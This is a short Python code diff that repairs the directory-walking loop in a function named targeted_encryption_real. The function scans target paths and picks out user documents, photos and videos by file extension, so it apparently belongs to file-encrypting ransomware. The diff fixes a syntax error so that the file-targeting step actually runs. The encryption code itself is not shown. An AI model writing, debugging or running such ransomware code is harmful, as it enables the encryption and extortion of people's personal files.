@@ -229,7 +229,9 @@ def targeted_encryption_real():
             continue
             
         print(f"[+] Scanning: {target_path}")
-        for root, dirs, dirs[:] = [], files in os.walk(target_path):
+
+        for root, dirs, files in os.walk(target_path):
+            dirs[:] = []
             for file in files:
                 if file.endswith(('.txt', '.doc', '.docx', '.pdf', '.jpg', '.png', '.mp4')):
                     file_path = os.path.join(root, file)
